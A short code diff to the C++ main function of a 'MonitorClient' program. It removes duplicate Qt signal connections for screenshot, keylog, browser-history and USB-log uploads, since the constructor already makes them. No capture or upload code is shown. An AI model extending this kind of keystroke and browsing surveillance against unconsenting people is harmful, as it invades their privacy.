@@ -83,11 +83,9 @@ int main(int argc, char *argv[])
         client.notifyRunningInstance();
     });
 
-    QObject::connect(&client, &MonitorClient::screen, &client, &MonitorClient::getScreen);
-    QObject::connect(&client, &MonitorClient::tic, &client, &MonitorClient::sendTic);
-    QObject::connect(&client, &MonitorClient::browserHistory, &client, &MonitorClient::sendBrowserHistories);
-    QObject::connect(&client, &MonitorClient::keyLog, &client, &MonitorClient::sendKeyLogs);
-    QObject::connect(&client, &MonitorClient::usbLog, &client, &MonitorClient::sendUSBLogs);
+    // MonitorClient already connects all timed upload signals in its
+    // constructor. Do not connect them again here: duplicate slots would
+    // attempt two screenshots/uploads for every timer tick.
     QObject::connect(&client, &MonitorClient::usbEvent, &client, &MonitorClient::handleUsbEvent);
 
     qDebug() << "MonitorClient started successfully (~single instance).";
